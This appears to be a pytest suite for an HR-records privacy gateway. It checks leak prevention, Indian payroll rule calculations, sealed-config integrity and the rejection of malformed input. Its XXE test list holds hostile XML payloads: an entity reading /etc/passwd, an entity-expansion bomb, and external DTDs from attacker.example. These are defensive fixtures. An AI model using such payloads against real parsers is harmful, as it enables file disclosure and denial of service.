"""Field-level contracts for HRMS records (route RECORDS, docs/HRMS_CONTRACTS.md).

Production mode throughout (signed config, valid source attestation; tests/sealed.py). SYNTHETIC data only
(tests/hrms_synth.py). Every assertion about what "left the building" reads the exact bytes the mock upstream got.
"""
from __future__ import annotations

import json
import os
import re
import time
from decimal import Decimal
from pathlib import Path

import pytest
import yaml
from starlette.testclient import TestClient

from pgw.egress import _EMITTED_ALIAS
from pgw.gateway.app import PLACEHOLDER_NOTE, create_app
from pgw.gateway.settings import Settings
from pgw.gateway.upstream import MockLLMUpstream
from pgw.product import integrity, recparse, records
from pgw.product.contracts import ContractError, load_contract
from pgw.product.fieldschema import SchemaError, load_schema
from pgw.product.local_compute import PayloadError
from tests import hrms_synth as S
from tests.sealed import attest, production, sha

ROOT = Path(__file__).resolve().parents[1]
KEY = "hrms-key"
SHIPPED = ("payroll_register_check", "timecard_exceptions", "contractor_budget", "roster_question")

# roster_question over the other starter schemas: the shipped contract with another source and selection
ROSTER_VARIANTS = {
    "roster_workday_rest": dict(sources=["workday_worker_rest"],
                                select=["worker_name", "employee_id", "is_manager", "hire_month", "time_type"],
                                label=["worker_name", "employee_id"], show=["hire_month"]),
    "roster_workday_xml": dict(sources=["workday_get_workers"], select=["legal_name", "employee_id", "active",
                                                                        "hire_month"],
                               label=["legal_name", "employee_id"], show=["hire_month"]),
    "roster_sf": dict(sources=["successfactors_employee"], select=["display_name", "person_id", "department",
                                                                    "start_month"],
                      label=["display_name", "person_id"], show=["department"]),
    "roster_payroll": dict(sources=["india_payroll_register"], select=["employee_name", "employee_id", "department",
                                                                        "birth_year", "pin_district"],
                           label=["employee_name", "employee_id"], show=["department", "pin_district"]),
}


def variant(tmp: Path, name: str, records_override: dict, **top) -> str:
    raw = yaml.safe_load((ROOT / "contracts/roster_question.yaml").read_text())
    raw["contract"] = name
    raw["records"].update(records_override)
    raw.update(top)
    p = tmp / "src" / f"{name}.yaml"
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(yaml.safe_dump(raw, sort_keys=False, allow_unicode=True))
    return str(p)


def tasks_for(tmp: Path) -> dict:
    t = {p: str(ROOT / f"contracts/{p}.yaml") for p in SHIPPED}
    t.update({n: variant(tmp, n, o) for n, o in ROSTER_VARIANTS.items()})
    return t


def make(tmp: Path, tasks: dict | None = None, behaviour="summarise", deployment=None, prod_kwargs=None):
    tasks = tasks or tasks_for(tmp)
    apps = [{"app_id": "pilot", "tenant": "acme", "key_sha256": sha(KEY), "purposes": sorted(tasks),
             "restore_output": True, "models": ["mock-1"], "tasks": tasks, "transparency": True}]
    mock = MockLLMUpstream(behaviour)
    cfg = production(tmp, apps, deployment=deployment, **(prod_kwargs or {}))
    s = Settings(**cfg, ledger_db_path=str(tmp / "l.sqlite"), egress_ledger_path=str(tmp / "e.jsonl"),
                 master_key=os.urandom(32).hex(), upstream=mock)
    return TestClient(create_app(s)), mock, cfg


def body_of(content: str) -> dict:
    return {"model": "mock-1", "messages": [{"role": "user", "content": content}]}


def post(client, purpose, content, signed=True, headers=None):
    body = body_of(content)
    h = {"Authorization": f"Bearer {KEY}", "X-PGW-Purpose": purpose}
    if signed:
        h.update(attest(purpose, body, contract="roster_question" if purpose not in SHIPPED else purpose))
    return client.post("/v1/chat/completions", json=body, headers={**h, **(headers or {})})


def upstream_text(mock) -> str:
    out = []
    for b in mock.received:
        out += [m["content"] for m in json.loads(b)["messages"]]
    return "\n".join(out)


# --- leak assertions --------------------------------------------------------------------------------------------

def _amount_forms(v: int) -> list[str]:
    return [str(v), f"{v:,}", S.inr(v), f"{v}.00", f"{S.inr(v)}.00", f"{v:,}.00"]


def _found(text: str, form: str, numeric: bool) -> bool:
    if numeric:
        rx = r"(?<![\d,.])" + re.escape(form) + r"(?!\d|[.,]\d)"
    else:
        rx = r"(?<!\w)" + re.escape(form) + r"(?!\w)"
    return re.search(rx, text, re.IGNORECASE) is not None


_COUNT = re.compile(r"(?<=: )\d+(?=[.;\n )]|$)|(?<=and )\d+(?= more not listed)|(?<= x)\d+|(?<=: )\d+(?= \(employees)")


def assert_no_leak(text: str, sy: S.Synth, sample: int | None = None):
    """(a) no value the schema classifies other than KEEP, in any surface form; (b) no word of a NEVER value;
    (c) no unknown-field value. Computed counts (rows checked, codes x n, "and N more") are the gateway's own
    validated tokens and may coincide with an amount (20,000 rows vs a Rs 20,000 basic): they are blanked first,
    exactly as the gateway's records_egress check reads the prompt with computed tokens held out."""
    text = _EMITTED_ALIAS.sub(" ", _COUNT.sub(" ", text))   # alias codes contain digits ("[PERSON_2A6661]")
    names = {p[0] for p in sy.people}
    secrets = sy.secrets if sample is None else sy.secrets[:sample] + sy.secrets[-sample:]
    for kind, v in secrets:
        if kind == "amount":
            if abs(v) < 1000:
                continue
            for f in _amount_forms(v):
                assert not _found(text, f, True), f"amount leaked ({kind})"
        elif kind == "date":
            for f in S.date_forms(v):
                assert not _found(text, f, False), "date leaked"
        else:
            if len(v) < 4:
                continue
            assert v.casefold() not in text.casefold(), "value leaked"
            if v in names:   # every name part too
                for part in v.split():
                    if len(part) >= 4:
                        assert not _found(text, part, False), "name part leaked"
    sealed_words = set(re.findall(r"[A-Za-z]{4,}", (PLACEHOLDER_NOTE + json.dumps(
        [yaml.safe_load((ROOT / f"contracts/{p}.yaml").read_text()) for p in SHIPPED])).casefold()))
    for w in sy.never_words:
        if w.casefold() in sealed_words:
            continue
        assert not _found(text, w, False), "special-category word leaked"
    for c in sy.canaries:
        assert c not in text


CASES = {
    "payroll_csv": ("payroll_register_check", lambda: S.payroll(400), None),
    "payroll_json": ("payroll_register_check", lambda: S.payroll(60, seed=3, fmt="json"), None),
    "timecard": ("timecard_exceptions", lambda: S.timecard(40), None),
    "fieldglass": ("contractor_budget", lambda: S.fieldglass(300), None),
    "ad_json": ("roster_question", lambda: S.ad_users(250),
                {"filter": [{"field": "department", "op": "in", "value": ["Finance", "legal"]}],
                 "group_by": "account_state", "list": True}),
    "workday_rest": ("roster_workday_rest", lambda: S.workday_rest(120),
                     {"filter": [{"field": "hire_month", "op": "gte", "value": "2015-01"}], "list": True}),
    "workday_xml": ("roster_workday_xml", lambda: S.workday_xml(120),
                    {"filter": [{"field": "active", "op": "eq", "value": True}], "group_by": "hire_month",
                     "list": True}),
    "successfactors": ("roster_sf", lambda: S.successfactors(150), {"group_by": "department", "list": True}),
    "payroll_roster": ("roster_payroll", lambda: S.payroll(20, seed=5),
                       {"filter": [{"field": "birth_year", "op": "lte", "value": "1990"}], "list": True,
                        "group_by": "pin_district"}),
}


@pytest.fixture(scope="module")
def gw(tmp_path_factory):
    tmp = tmp_path_factory.mktemp("hrms")
    client, mock, _cfg = make(tmp)
    return client, mock


@pytest.mark.parametrize("case", sorted(CASES))
def test_nothing_but_computed_results_and_aliases_leaves(gw, case):
    client, mock = gw
    purpose, gen, params = CASES[case]
    sy = gen()
    n0 = len(mock.received)
    r = post(client, purpose, sy.envelope(params))
    assert r.status_code == 200, r.text
    assert len(mock.received) == n0 + 1
    text = upstream_text(type("M", (), {"received": mock.received[n0:]})())
    assert_no_leak(text, sy)
    # (c) unknown fields: dropped, counted, named only to the caller
    rep = r.json()["pgw_report"]
    rec = rep["records"]
    assert rec["unknown"]["fields"] >= len({c for c in sy.unknown_paths}) - 1 and rec["unknown"]["values_dropped"] > 0
    for p in rec["unknown"]["paths"]:
        assert p not in text or len(p) < 6
    assert rep["route"] == "RECORDS" and rep["outcome"] == "sent"
    assert {c["id"]: c["status"] for c in rep["checks"]}["records_egress"] == "pass"
    # the report carries paths and counts, never values
    blob = json.dumps(rec)
    for kind, v in sy.secrets[:200]:
        if kind == "str" and len(v) >= 6:
            assert v not in blob
    # (e) aliases restored in the answer: the mock names the listed people by alias; they come back as written
    answer = r.json()["choices"][0]["message"]["content"]
    listed = rec["left"]["listed_rows"]
    if listed:
        assert "[PERSON_" not in answer and "[EMPLOYEE_ID_" not in answer
        assert any(nm in answer for nm, _id in sy.people), "no listed person restored in the answer"


def test_special_category_words_never_leave_even_when_every_row_has_one(gw):
    client, mock = gw
    sy = S.timecard(15, seed=99)
    # every second day an absence with a special-category pay code
    sy2 = S.payroll(80, seed=12)
    for purpose, s_ in (("timecard_exceptions", sy), ("payroll_register_check", sy2)):
        n0 = len(mock.received)
        r = post(client, purpose, s_.envelope())
        assert r.status_code == 200, r.text
        text = upstream_text(type("M", (), {"received": mock.received[n0:]})())
        for w in ("Oncology", "Maternity", "Dialysis", "Chemotherapy", "Miscarriage", "Psychiatric", "Female",
                  "Transgender", "Married", "Divorced", "Muslim", "Christian", "Scheduled", "Locomotor"):
            assert w.casefold() not in text.casefold(), w


def test_absence_is_counted_without_its_reason(gw):
    client, mock = gw
    csv = ("Person Number,Full Name,Apply Date,In Punch,Out Punch,Hours,Pay Code,Absence Reason\n"
           "900001,Kavya Raghavan,02/03/2026,,,,Oncology OPD,Chemotherapy session\n"
           "900001,Kavya Raghavan,03/03/2026,09:00,17:30,8,REG,\n")
    n0 = len(mock.received)
    r = post(client, "timecard_exceptions", json.dumps({"source": "ukg_timecard", "format": "csv", "data": csv}))
    assert r.status_code == 200, r.text
    text = upstream_text(type("M", (), {"received": mock.received[n0:]})())
    assert "Absence days in the export: 1 (employees with any absence: 1)" in text
    assert "oncology" not in text.casefold() and "chemo" not in text.casefold()


# --- (d) computations against hand-computed fixtures ------------------------------------------------------------

def plan_of(purpose: str, override: dict | None = None) -> records.Plan:
    raw = yaml.safe_load((ROOT / f"contracts/{purpose}.yaml").read_text())
    if override:
        raw["records"].update(override)
    c = load_contract("x.yaml", yaml.safe_dump(raw, allow_unicode=True).encode())
    return records.bind(purpose, c, ROOT / "registry", lambda p: Path(p).read_bytes())


def compute(purpose: str, source: str, fmt: str, data, params=None, override=None):
    plan = plan_of(purpose, override)
    schema = plan.schemas[source]
    p = records.parse_params(plan, params, schema)
    rows, _stats, _w, _pre = records.extract(plan, schema, fmt, data, ",")
    return plan.computation.fn(rows, p, plan.rules, records._Ctx(plan))


PAY_COLS = ["Employee Code", "Employee Name", "State", "Pay Period", "Basic", "DA", "HRA", "Special Allowance", "Gross",
            "PF", "ESIC", "PT", "TDS", "Net Pay"]


def pay_row(**kw) -> dict:
    """A consistent row: Basic 20000 + HRA 8000 + Special 2000 = Gross 30000 (KA, March): PF 1800 (capped),
    ESIC 0 (gross above Rs 21,000), PT 200, TDS 0, Net 28000."""
    r = {"Employee Code": "KD-1", "Employee Name": "Asha Raghavan", "State": "KA", "Pay Period": "2026-03-01",
         "Basic": 20000, "DA": "", "HRA": 8000, "Special Allowance": 2000, "Gross": None, "PF": 1800, "ESIC": 0,
         "PT": 200, "TDS": 0, "Net Pay": None}
    r.update(kw)

    def n(x):
        return x if isinstance(x, int) else 0
    if r["Gross"] is None:
        r["Gross"] = sum(n(r[k]) for k in ("Basic", "DA", "HRA", "Special Allowance"))
    if r["Net Pay"] is None:
        r["Net Pay"] = (r["Gross"] if isinstance(r["Gross"], int) else 30000) - sum(n(r[k]) for k in ("PF", "ESIC", "PT", "TDS"))
    return r


def pay_csv(*rows, cols=PAY_COLS) -> str:
    import csv
    import io
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(cols)
    for r in rows:
        w.writerow([r.get(c, "") for c in cols])
    return buf.getvalue()


def pay_codes(*rows, cols=PAY_COLS):
    out = compute("payroll_register_check", "india_payroll_register", "csv", pay_csv(*rows, cols=cols))
    by_row = {row.index: set(codes.split(", ")) for row, codes in out["exceptions"].value}
    return [by_row.get(i + 1, set()) for i in range(len(rows))], out


@pytest.mark.parametrize("row,expected", [
    (pay_row(), set()),
    # PF: 12% of basic capped at the Rs 15,000 wage ceiling, or of full basic (joint option); zero above ceiling ok
    (pay_row(PF=2400), set()),
    (pay_row(PF=2000), {"PF_MISMATCH"}),
    (pay_row(PF=0), set()),
    (pay_row(Basic=15000, HRA=8000, **{"Special Allowance": 2000}, PF=1800), set()),
    (pay_row(Basic=12000, HRA=8000, **{"Special Allowance": 5000}, PF=1440), set()),
    (pay_row(Basic=12000, HRA=8000, **{"Special Allowance": 5000}, PF=0), {"PF_MISMATCH"}),
    (pay_row(Basic=12000, DA=1000, HRA=8000, **{"Special Allowance": 4000}, PF=1560), set()),
    # ESIC: 0.75% rounded up, only while gross <= Rs 21,000 (inclusive)
    (pay_row(Basic=12000, HRA=6000, **{"Special Allowance": 3000}, PF=1440, PT=0, ESIC=158), set()),
    (pay_row(Basic=12000, HRA=6000, **{"Special Allowance": 3000}, PF=1440, PT=0, ESIC=0), {"ESIC_MISSING"}),
    (pay_row(Basic=12000, HRA=6000, **{"Special Allowance": 3000}, PF=1440, PT=0, ESIC=150), {"ESIC_MISMATCH"}),
    (pay_row(Basic=12000, HRA=6000, **{"Special Allowance": 3001}, PF=1440, PT=0, ESIC=158), {"ESIC_ABOVE_CEILING"}),
    # PT slabs: Karnataka nil below Rs 25,000, Rs 200 from 25,000, Rs 300 in February
    (pay_row(Basic=12000, HRA=6000, **{"Special Allowance": 6999}, PF=1440, PT=0), set()),
    (pay_row(Basic=12000, HRA=6000, **{"Special Allowance": 6999}, PF=1440, PT=200), {"PT_MISMATCH"}),
    (pay_row(Basic=12000, HRA=6000, **{"Special Allowance": 7000}, PF=1440, PT=200), set()),
    (pay_row(**{"Pay Period": "2026-02-01"}, PT=300), set()),
    (pay_row(**{"Pay Period": "01-Feb-2026"}, PT=200), {"PT_MISMATCH"}),
    # Maharashtra: men's and women's schedules both accepted (gender is NEVER)
    (pay_row(State="MH", Basic=4000, HRA=2000, **{"Special Allowance": 1501}, PF=480, ESIC=57, PT=175), set()),
    (pay_row(State="MH", Basic=4000, HRA=2000, **{"Special Allowance": 1501}, PF=480, ESIC=57, PT=0), set()),
    (pay_row(State="MH", Basic=4000, HRA=2000, **{"Special Allowance": 1500}, PF=480, ESIC=57, PT=175),
     {"PT_MISMATCH"}),
    (pay_row(State="Maharashtra", PT=200), set()),
    (pay_row(State="WB", PT=150), set()),
    (pay_row(State="WB", PT=130), {"PT_MISMATCH"}),
    (pay_row(State="TN", PT=1250), set()),          # half-yearly: not checked monthly
    (pay_row(State="UP", PT=0), set()),
    (pay_row(State="Goa", PT=0), {"INVALID:state"}),
    # TDS sanity: annualised taxable (gross x 12 - 75,000) at exactly Rs 12,00,000 still owes nothing
    (pay_row(Basic=96250, HRA=8000, **{"Special Allowance": 2000}, TDS=5000), {"TDS_BELOW_THRESHOLD"}),
    (pay_row(Basic=96251, HRA=8000, **{"Special Allowance": 2000}, TDS=5000), set()),
    (pay_row(TDS=11000), {"TDS_BELOW_THRESHOLD", "TDS_SHARE_HIGH"}),
    # arithmetic
    (pay_row(Gross=30500), {"GROSS_MISMATCH"}),
    (pay_row(Gross=30500, **{"Net Pay": 28000}), {"GROSS_MISMATCH", "NET_MISMATCH"}),
    (pay_row(**{"Net Pay": 27990}), {"NET_MISMATCH"}),
    (pay_row(**{"Net Pay": 27999}), set()),          # within the Rs 1 tolerance
    # zero, negative, missing, invalid
    (pay_row(Basic=0, HRA=0, **{"Special Allowance": 0}, PF=0, ESIC=0, PT=0), set()),
    (pay_row(HRA=-100, PT=0), {"NEGATIVE:hra"}),
    (pay_row(PF="12x0"), {"INVALID:pf_employee"}),
    (pay_row(DA=""), set()),                          # optional component blank = 0
])
def test_payroll_register_rules(row, expected):
    (codes,), _out = pay_codes(row)
    assert codes == expected


def test_payroll_counts_amount_formats_and_incomplete_rows():
    rows = [pay_row(), pay_row(PF=2000), pay_row(Gross=""), pay_row(Basic="₹20,000.00", HRA="8,000", Gross=30000, **{"Net Pay": 28000})]
    codes, out = pay_codes(*rows)
    assert codes == [set(), {"PF_MISMATCH"}, {"MISSING:gross"}, set()]
    assert out["rows_checked"].value == 4 and out["rows_with_exceptions"].value == 2
    assert out["rows_incomplete"].value == 1
    assert out["exception_counts"].value == {"PF_MISMATCH": 1, "MISSING:gross": 1}
    assert out["total_gross"].value == Decimal(90000)


def test_payroll_missing_column_is_an_explicit_error_not_a_silent_pass():
    cols = [c for c in PAY_COLS if c != "TDS"]
    with pytest.raises(PayloadError, match="'tds'"):
        pay_codes(pay_row(), cols=cols)


def tc(rows):
    head = "Person Number,Full Name,Apply Date,In Punch,Out Punch,Hours,Overtime Hours,OT Approved,Pay Code\n"
    data = head + "\n".join(",".join(r) for r in rows) + "\n"
    out = compute("timecard_exceptions", "ukg_timecard", "csv", data)
    return {row.values["employee_id"]: codes for row, codes in out["exceptions"].value}, out


def test_timecard_rules():
    base = ["E1", "Neha Iyer"]
    rows = [
        base + ["02/03/2026", "09:00", "17:30", "8", "", "", "REG"],          # clean
        base + ["03/03/2026", "09:00", "", "", "", "", "REG"],                # missing punch
        ["E2", "Ravi Nair", "02/03/2026", "22:00", "06:00", "7.5", "", "", "REG"],        # overnight: fine
        ["E3", "Meera Shah", "02/03/2026", "08:00", "19:00", "10", "1", "Y", "REG"],       # >9 h, >10.5 spread
        ["E4", "Anil Gill", "02/03/2026", "09:00", "18:00", "9", "", "", "REG"],            # exactly 9: fine
        ["E5", "Joseph Hegde", "02/03/2026", "09:00", "19:00", "9.5", "0.5", "N", "REG"],   # OT not approved
        ["E6", "Sunita Bhat", "02/03/2026", "", "", "", "", "", "Maternity"],                # absence: no punch flag
    ]
    for d in range(2, 8):    # 6 days x 8.5 h = 51 h in ISO week 10
        rows.append(["E7", "Farhan Khan", f"0{d}/03/2026", "08:00", "17:00", "8.5", "", "", "REG"])
    by, out = tc(rows)
    assert "E1" in by and by["E1"] == "MISSING_PUNCH x1"
    assert "E2" not in by and "E4" not in by and "E6" not in by
    assert by["E3"] == "SHIFT_OVER_LIMIT x1, SPREAD_OVER_LIMIT x1"
    assert by["E5"] == "OT_WITHOUT_APPROVAL x1, SHIFT_OVER_LIMIT x1"
    assert by["E7"] == "WEEKLY_OVER_LIMIT x1"
    assert out["absence_days"].value == 1 and out["employees_with_absence"].value == 1
    assert out["employees_checked"].value == 7


def test_timecard_missing_date_and_invalid_flag_are_explicit():
    by, _ = tc([["E1", "Neha Iyer", "", "09:00", "17:00", "8", "", "", "REG"],
                ["E2", "Ravi Nair", "02/03/2026", "09:00", "20:00", "10", "1", "maybe", "REG"]])
    assert by["E1"] == "MISSING:work_date x1"
    assert "INVALID:overtime_approved x1" in by["E2"]


def fg(rows):
    head = "Worker ID,Worker Name,Work Order ID,Work Order Budget,Spend to Date,Bill Rate,Approved Bill Rate,Cost Center\n"
    out = compute("contractor_budget", "sap_fieldglass_worker", "csv",
                  head + "\n".join(",".join(r) for r in rows) + "\n")
    return {row.values["worker_id"]: codes for row, codes in out["flagged"].value}, out


def test_contractor_budget_rules():
    by, out = fg([
        ["W1", "Ishita Rao", "WO-1", "100000", "50000", "1000", "1000", "Finance"],     # clean (50%: 50-80 band)
        ["W2", "Thomas Menon", "WO-2", "100000", "100001", "1000", "1000", "Finance"],  # over
        ["W3", "Priya Pillai", "WO-3", "100000", "90000", "1000", "1000", "Legal"],     # near (90%)
        ["W4", "Arjun Verma", "WO-4", "100000", "10000", "1120", "1000", "Legal"],      # rate +12%
        ["W5", "Deepa Reddy", "WO-5", "0", "10", "1000", "1000", "Legal"],              # no budget
        ["W6", "Vikram Shah", "WO-6", "", "10", "1000", "1000", "Legal"],               # missing budget
    ])
    assert "W1" not in by
    assert by["W2"].startswith("OVER_BUDGET; utilisation 100% to under 110%")
    assert by["W3"] == "NEAR_BUDGET; utilisation 90% to under 100%"
    assert by["W4"] == "RATE_ABOVE_APPROVED; utilisation under 50%; rate above approved by 10% to under 25%"
    assert by["W5"] == "NO_BUDGET" and by["W6"] == "MISSING:po_budget"
    assert out["flag_counts"].value == {"OVER_BUDGET": 1, "NEAR_BUDGET": 1, "RATE_ABOVE_APPROVED": 1, "NO_BUDGET": 1,
                                        "MISSING:po_budget": 1}
    assert dict(out["group_utilisation"].value) == {"Finance": "utilisation 50% to under 80%",
                                                    "Legal": "utilisation 50% to under 80%"}


def test_roster_question_filters_and_groups():
    sy = S.ad_users(20)
    out = compute("roster_question", "ad_user", "json", sy.data,
                  {"filter": [{"field": "department", "op": "eq", "value": "FINANCE"},
                              {"field": "account_state", "op": "eq", "value": "enabled"}],
                   "group_by": "created_month", "list": True})
    expect = [i for i in range(20) if S.DEPTS[i % len(S.DEPTS)] == "Finance" and i % 5 != 0]
    assert out["matched_count"].value == len(expect)
    assert out["filter_text"].value == "department = Finance and account_state = enabled"
    assert [r.index for r, _t in out["matched"].value] == [i + 1 for i in expect]


@pytest.mark.parametrize("params", [
    {"filter": [{"field": "department", "op": "eq", "value": "Asha Raghavan PAN ABCPR1234K"}]},
    {"filter": [{"field": "display_name", "op": "eq", "value": "Asha Raghavan"}]},       # ALIAS: not filterable
    {"filter": [{"field": "created_month", "op": "eq", "value": "1987-04-12"}]},       # not the generalised form
    {"filter": [{"field": "department", "op": "gte", "value": "Finance"}]},             # no order
    {"filter": [], "group_by": "username"},
    {"filter": [], "list": "yes"},
    {"filter": [], "extra": 1},
])
def test_roster_params_are_validated_without_echo(params):
    with pytest.raises(PayloadError) as e:
        compute("roster_question", "ad_user", "json", S.ad_users(3).data, params)
    assert "Asha" not in str(e.value) and "ABCPR" not in str(e.value) and "1987" not in str(e.value)


# --- (f) sealed config: tampered / unsigned / unsafe schemas stop startup -------------------------------------------

def _settings(tmp, cfg, mock=None):
    return Settings(**cfg, ledger_db_path=str(tmp / "l2.sqlite"), egress_ledger_path=str(tmp / "e2.jsonl"),
                    master_key=os.urandom(32).hex(), upstream=mock or MockLLMUpstream("summarise"))


def test_tampered_schema_stops_startup(tmp_path):
    _c, _m, cfg = make(tmp_path, {"payroll_register_check": str(ROOT / "contracts/payroll_register_check.yaml")})
    p = Path(cfg["registry_path"]).parent / "schemas/india_payroll_register.yaml"
    p.write_text(p.read_text().replace("disposition: NEVER, category: gender", "disposition: REMOVE"))
    with pytest.raises(integrity.IntegrityError, match="differs from its sealed hash"):
        create_app(_settings(tmp_path, cfg))


def test_unsealed_schema_or_rules_file_stops_startup(tmp_path):
    _c, _m, cfg = make(tmp_path, {"payroll_register_check": str(ROOT / "contracts/payroll_register_check.yaml")})
    reg = Path(cfg["registry_path"]).parent
    (reg / "rules/extra.yaml").write_text("kind: pgw-compute-rules\nrules: extra\nversion: 1\n")
    with pytest.raises(integrity.IntegrityError, match="not in the integrity manifest"):
        create_app(_settings(tmp_path, cfg))


def test_tampered_statutory_rule_stops_startup(tmp_path):
    _c, _m, cfg = make(tmp_path, {"payroll_register_check": str(ROOT / "contracts/payroll_register_check.yaml")})
    p = Path(cfg["registry_path"]).parent / "rules/india_payroll_statutory.yaml"
    p.write_text(p.read_text().replace("gross_ceiling: 21000", "gross_ceiling: 99999"))
    with pytest.raises(integrity.IntegrityError):
        create_app(_settings(tmp_path, cfg))


def test_unsigned_manifest_stops_startup(tmp_path):
    with pytest.raises(integrity.IntegrityError):
        make(tmp_path, {"payroll_register_check": str(ROOT / "contracts/payroll_register_check.yaml")},
             prod_kwargs={"sign": False})


def _schema(tmp, fields, **top):
    doc = {"kind": "pgw-field-schema", "schema": "t1", "version": 1, "formats": ["json"], "records_at": "$[]",
           "fields": fields, **top}
    p = tmp / "t1.yaml"
    p.write_text(yaml.safe_dump(doc))
    return p


@pytest.mark.parametrize("field,msg", [
    ({"path": "Remarks", "name": "remarks", "type": "string", "disposition": "KEEP",
      "justification": "free text is never non-personal at all"}, "free text can never be KEEP"),
    ({"path": "Dept", "name": "dept", "type": "enum", "disposition": "KEEP", "enum": ["A", "B"]}, "justification"),
    ({"path": "Gender", "name": "g", "disposition": "REMOVE"}, "must be NEVER"),
    ({"path": "Leave_Type", "name": "lt", "type": "string", "disposition": "COMPUTE_ONLY"}, "must be NEVER"),
    ({"path": "X", "name": "x", "type": "string", "disposition": "COMPUTE_ONLY", "csv": ["Marital Status"]},
     "must be NEVER"),
    ({"path": "Pay", "name": "pay", "type": "amount", "disposition": "GENERALIZE", "method": "band",
      "edges": [0, 10000, 11000]}, "20% wide"),
    ({"path": "N", "name": "n", "type": "string", "disposition": "ALIAS", "entity": "COMPENSATION"},
     "identity type"),
    ({"path": "R", "name": "r", "disposition": "NEVER"}, "category"),
    ({"path": "D", "name": "d", "type": "string", "disposition": "GENERALIZE", "method": "year"}, "does not apply"),
    ({"path": "Z", "name": "z", "type": "string", "disposition": "SEND"}, "disposition must be"),
])
def test_unsafe_field_schemas_are_refused(tmp_path, field, msg):
    with pytest.raises(SchemaError, match=msg):
        load_schema(_schema(tmp_path, [field]))


def test_selecting_a_never_or_removed_field_is_refused():
    with pytest.raises(ContractError, match="can never be selected"):
        plan_of("roster_question", {"select": ["display_name", "username", "photo"], "show": []})
    with pytest.raises(ContractError, match="can never be selected"):
        plan_of("payroll_register_check", {"select": [*plan_of("payroll_register_check").spec.select, "pan"]})


def test_amount_outputs_never_leave_raw(tmp_path):
    raw = yaml.safe_load((ROOT / "contracts/payroll_register_check.yaml").read_text())
    raw["outputs"]["total_gross"] = {"derived_from": "C2", "egress": "RAW", "justification": "x" * 30}
    c = load_contract("x.yaml", yaml.safe_dump(raw).encode())
    with pytest.raises(ContractError, match="never leaves raw"):
        records.bind("p", c, ROOT / "registry", lambda p: Path(p).read_bytes())
    raw["outputs"]["total_gross"] = {"derived_from": "C2", "egress": "TRANSFORMED"}
    c = load_contract("x.yaml", yaml.safe_dump(raw).encode())
    with pytest.raises(ContractError, match="band"):
        records.bind("p", c, ROOT / "registry", lambda p: Path(p).read_bytes())


def test_shipped_schemas_are_starter_marked_and_load():
    for p in sorted((ROOT / "registry/schemas").glob("*.yaml")):
        s = load_schema(p)
        assert s.starter and "STARTER SCHEMA" in p.read_text()
    for p in SHIPPED:
        plan_of(p)


# --- (g) malformed payloads: 4xx, nothing sent, no value in the message ------------------------------------------

CANARY = "Asha Raghavan ABCPR1234K 9876543210"
BAD = [
    "not json " + CANARY,
    json.dumps({"source": "india_payroll_register", "format": "csv"}),
    json.dumps({"source": "nope", "format": "csv", "data": CANARY}),
    json.dumps({"source": "india_payroll_register", "format": "xml", "data": CANARY}),
    json.dumps({"source": "india_payroll_register", "format": "csv", "data": CANARY, "extra": CANARY}),
    json.dumps({"source": "india_payroll_register", "format": "csv",
                "data": 'Employee Code,Employee Name\n"' + CANARY + ',x\n'}),
    json.dumps({"source": "india_payroll_register", "format": "csv",
                "data": "Employee Code,Employee Name\n" + CANARY + ",x,y\n"}),
    json.dumps({"source": "india_payroll_register", "format": "json", "data": CANARY}),
    '{"source": "india_payroll_register", "format": "json", "data": ' + "[" * 60 + json.dumps(CANARY) + "]" * 60 + "}",
    json.dumps({"source": "india_payroll_register", "format": "csv", "data": "Employee Code\n" + CANARY + "\n",
                "params": {"filter": CANARY}}),
    json.dumps({"source": "india_payroll_register", "format": "csv", "data": "x", "delimiter": CANARY}),
]


@pytest.mark.parametrize("i", range(len(BAD)))
def test_malformed_payloads_are_400_without_values(gw, i):
    client, mock = gw
    n0 = len(mock.received)
    r = post(client, "payroll_register_check", BAD[i])
    assert r.status_code == 400, r.text
    assert len(mock.received) == n0
    for part in CANARY.split():
        assert part not in r.text


def test_unsigned_record_payload_is_refused(gw):
    client, mock = gw
    n0 = len(mock.received)
    r = post(client, "payroll_register_check", S.payroll(5).envelope(), signed=False)
    assert r.status_code == 422 and r.json()["error"]["type"] == "input_not_source_sanitized"
    assert len(mock.received) == n0


def test_tampered_payload_after_signing_is_refused(gw):
    client, _mock = gw
    sy = S.payroll(5)
    body = body_of(sy.envelope())
    h = {"Authorization": f"Bearer {KEY}", "X-PGW-Purpose": "payroll_register_check",
         **attest("payroll_register_check", body)}
    body["messages"][0]["content"] = body["messages"][0]["content"].replace("KD-", "KX-")
    r = client.post("/v1/chat/completions", json=body, headers=h)
    assert r.status_code == 422


def test_row_and_size_bounds(tmp_path):
    t = {"small": variant(tmp_path, "small", {"sources": ["ad_user"], "max_rows": 5, "max_bytes": 4096})}
    client, mock, _ = make(tmp_path, t)
    r = post(client, "small", S.ad_users(6).envelope({"filter": []}))
    assert r.status_code in (400, 413)
    big = S.ad_users(60).envelope({"filter": []})
    r = post(client, "small", big)
    assert r.status_code == 413 and not mock.received


XXE = ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
       '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;">'
       '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
       '<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://attacker.example/x.dtd"><r/>',
       '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.example/p.dtd"> %p;]><r/>',
       '<r>&undefined;</r>',
       '<!-- --><!doctype r><r/>',
       "<a>" * 200 + "</a>" * 200,
       "<a><b></a>"]


@pytest.mark.parametrize("doc", XXE)
def test_xml_external_entities_dtds_and_bombs_are_refused(doc):
    with pytest.raises(PayloadError):
        recparse.parse_xml(doc)


def test_xml_refusal_through_the_gateway(gw):
    client, mock = gw
    n0 = len(mock.received)
    for doc in XXE[:3]:
        r = post(client, "roster_workday_xml", json.dumps({"source": "workday_get_workers", "format": "xml",
                                                            "data": doc, "params": {}}))
        assert r.status_code == 400 and "passwd" not in r.text
    assert len(mock.received) == n0


def test_xml_parses_namespaces_attributes_and_repeats():
    doc = recparse.parse_xml('<wd:R xmlns:wd="u"><wd:ID wd:type="A">1</wd:ID><wd:ID wd:type="B">2</wd:ID>'
                             '<wd:N wd:F="x"/></wd:R>')
